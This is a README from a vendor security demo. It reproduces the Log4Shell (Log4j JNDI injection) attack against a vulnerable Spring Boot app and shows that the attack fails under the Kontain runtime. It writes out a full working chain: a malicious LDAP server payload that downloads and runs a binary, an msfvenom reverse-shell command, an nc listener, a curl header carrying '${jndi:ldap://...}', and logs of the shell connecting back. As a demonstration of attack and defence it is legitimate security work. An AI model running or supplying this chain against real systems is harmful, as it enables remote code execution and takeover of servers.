# Log4j Exploit

## Introduction

This document

* Explains how a particular version of the Log4j vulnerability works.  Instructions for reproducing the exploit are given
* Shows how this attack succeeds (that is, maliciously infects) when using standard Docker containers
* Shows how this attack fails (that is, is unable to infect) the same container built with Kontain

This newsworthy situation is just one of many demonstrations of the benefits of running workloads in environments that are inherently more secure by (a) strongly isolating workloads from each other (reducing the blast radius), and (b) dramatically reducing the number of potential points of vulnerability (reducing the attack surface).

## Basis for the exploit code

We use the following github repos:

### Victim

Fork of https://github.com/christophetd/log4shell-vulnerable-app with tiny modifications.
This is the vulnerable victim application.

The Log4j vulnerability exists in Java version 8.
However, as of now Kontain supports only Java 11.
To make Java 11 susceptible to this attack, we set trustURLCodebase:
```
com.sun.jndi.ldap.object.trustURLCodebase=true
```

### Malicious LDAP server

Fork of https://github.com/pimps/JNDI-Exploit-Kit also with tiny modifications.
This is the malicious LDAP server.
The project has other capabilities such as malicious RMI server and others, however for now we only use LDAP.

### Dial-back code

We also use metasploit project https://metasploit.com/ downloading installable RPM from https://rpm.metasploit.com/.

## Build

To build everything just run `make` in this directory.

## General flow of the attack

### Malicious LDAP (Terminal 1)

The malicious LDAP server takes an argument `-C "_command line_"' and creates Java byte code equivalent of:

```java
String[] cmd = new String[] { "/bin/bash", "-c", <command_line> };
Runtime.getRuntime().exec(cmd);
```

Then it creates LDAP and HTTP endpoint.
The LDAP endpoint is to be used in `jndi:ldap:` sent to the victim.

```
fc:10447> java -jar ./target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "wget http://127.0.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf"
       _ _   _ _____ _____      ______            _       _ _          _  ___ _
      | | \ | |  __ \_   _|    |  ____|          | |     (_) |        | |/ (_) |
      | |  \| | |  | || |______| |__  __  ___ __ | | ___  _| |_ ______| ' / _| |_
  _   | | . ` | |  | || |______|  __| \ \/ / '_ \| |/ _ \| | __|______|  < | | __|
 | |__| | |\  | |__| || |_     | |____ >  <| |_) | | (_) | | |_       | . \| | |_
  \____/|_| \_|_____/_____|    |______/_/\_\ .__/|_|\___/|_|\__|      |_|\_\_|\__|
                                           | |
                                           |_|               created by @welk1n
                                                             modified by @pimps

[HTTP_ADDR] >> 10.100.101.100
[RMI_ADDR] >> 10.100.101.100
[LDAP_ADDR] >> 10.100.101.100
[COMMAND] >> wget http://127.0.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf
----------------------------JNDI Links----------------------------
Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://10.100.101.100:1099/thvywc
Target environment(Build in JDK 1.5 whose trustURLCodebase is true):
rmi://10.100.101.100:1099/mx59um
ldap://10.100.101.100:1389/mx59um
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://10.100.101.100:1099/6qzeif
ldap://10.100.101.100:1389/6qzeif
Target environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath):
rmi://10.100.101.100:1099/tpmlzh
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://10.100.101.100:1099/rxkv1b
ldap://10.100.101.100:1389/rxkv1b
Target environment(Build in JDK 1.6 whose trustURLCodebase is true):
rmi://10.100.101.100:1099/7p5qra
ldap://10.100.101.100:1389/7p5qra

----------------------------Server Log----------------------------
2021-12-29 16:13:20 [JETTYSERVER]>> Listening on 10.100.101.100:8180
2021-12-29 16:13:20 [RMISERVER]  >> Listening on 10.100.101.100:1099
2021-12-29 16:13:20 [LDAPSERVER] >> Listening on 0.0.0.0:1389
```

Note that the _command line_ is:

```sh
wget http://127.0.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf
```

which means the victim will do the download of the `rev.elf` and the execute it.
`rev.elf` is dial back code that is created using metasploit framework.
It is executable that will connect shell to port `4444`.

And LDAP end point is `ldap://10.100.101.100:1389/6qzeif`.
Note last 6 are uniquely generated each time the server is started.

### Victim (Terminal 2)

The victim code that is under attack is just one line:
```java
logger.info("Received a request for API version " + apiVersion);
```

The trick is that the string argument to logger.info() is interpreted by JNDI.
Depending what is sent in `X-Api_Version:` header the result could be pretty interesting.

### dial back (`rev.elf`) server (Terminal 3)

We use metasploit framework to create the dial back code and HTTP host on port 8081.
The command line to create it is:

```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /tmp/rev.elf
```

### Ncat receiving dial back (Terminal 4)

There is no special code, we simply use ncat:

```sh
sudo nc -lvnp 4444
```

### Attacking curl (Terminal 5)

Again there is no special code, we just use curl with the LDAP end point from above encoded:

```sh
curl 127.0.0.2:8080 -H 'X-Api-Version: ${jndi:ldap://10.100.101.100:1389/6qzeif}'
```

## Snipets

### Terminal 5

```sh
$ curl 127.0.0.2:8080 -H 'X-Api-Version: ${jndi:ldap://10.100.101.100:1389/6qzeif}'
Hello, world!
```

### Termimal 2 (victim)

```
$ docker run --network=host --name vulnerable-app --rm vulnerable-app

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v2.6.1)

2021-12-29 17:56:49.808  INFO 1 --- [           main] f.c.l.v.VulnerableAppApplication         : Starting VulnerableAppApplication using Java 11.0.8-internal on fc with PID 1 (/app/spring-boot-application.jar started by ? in /)
2021-12-29 17:56:49.813  INFO 1 --- [           main] f.c.l.v.VulnerableAppApplication         : No active profile set, falling back to default profiles: default
2021-12-29 17:56:50.275  INFO 1 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 8080 (http)
2021-12-29 17:56:50.285  INFO 1 --- [           main] o.a.c.c.StandardService                  : Starting service [Tomcat]
2021-12-29 17:56:50.285  INFO 1 --- [           main] o.a.c.c.StandardEngine                   : Starting Servlet engine: [Apache Tomcat/9.0.55]
2021-12-29 17:56:50.311  INFO 1 --- [           main] o.a.c.c.C.[.[.[/]                        : Initializing Spring embedded WebApplicationContext
2021-12-29 17:56:50.311  INFO 1 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 475 ms
2021-12-29 17:56:50.471  INFO 1 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 8080 (http) with context path ''
2021-12-29 17:56:50.477  INFO 1 --- [           main] f.c.l.v.VulnerableAppApplication         : Started VulnerableAppApplication in 0.909 seconds (JVM running for 1.421)
2021-12-29 17:56:55.762  INFO 1 --- [nio-8080-exec-1] o.a.c.c.C.[.[.[/]                        : Initializing Spring DispatcherServlet 'dispatcherServlet'
2021-12-29 17:56:55.763  INFO 1 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
2021-12-29 17:56:55.764  INFO 1 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 1 ms

2021-12-29 17:56:26,462 http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://10.100.101.100:1389/syqot1]. javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: class ExecTemplateJDK8 cannot be cast to class javax.naming.spi.ObjectFactory (ExecTemplateJDK8 is in unnamed module of loader java.net.FactoryURLClassLoader @4653cf8c; javax.naming.spi.ObjectFactory is in module java.naming of loader 'bootstrap')]; remaining name '6qzeif'

... long stack trace ...

2021-12-29 17:56:26.420  INFO 1 --- [nio-8080-exec-1] HelloWorld                               : Received a request for API version ${jndi:ldap://10.100.101.100:1389/6qzeif}
```

The last line is log4j output, but it called malicous LDAP server.

### Terminal 1 (LDAP)

```
2021-12-29 17:01:39 [LDAPSERVER] >> Send LDAP reference result for 6qzeif redirecting to http://10.100.101.100:8180/ExecTemplateJDK8.class
2021-12-29 17:01:39 [JETTYSERVER]>> Received a request to http://10.100.101.100:8180/ExecTemplateJDK8.class
```

The first line logs the LDAP lookup that injects reference the Java byte code.
The second one fetches the class with the generated byte code.

### Terminal 3 (dial back code server)

```
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
127.0.0.1 - - [30/Dec/2021 00:08:34] "GET /rev.elf HTTP/1.1" 200 -
```

The second like indicates `rev.elf` was retrieved.

### Terminal 4 (ncat)

```
Ncat: Connection from 127.0.0.1:60152.
```

At this point we have access to shell commands in the victim, even if there is no prompt.
Try `ls -l`, `id`, or whatever.

## Flow with kontain

With the victim code in kontain the flow stops at Terminal 3.
To run the victim in konatain, on Terminal 2 step, run

```sh
docker run --runtime=krun --network=host --name vulnerable-app --rm vulnerable-app-kontain
```

The `rev.elf` never gets retrieved.
Nothing connect to ncat either.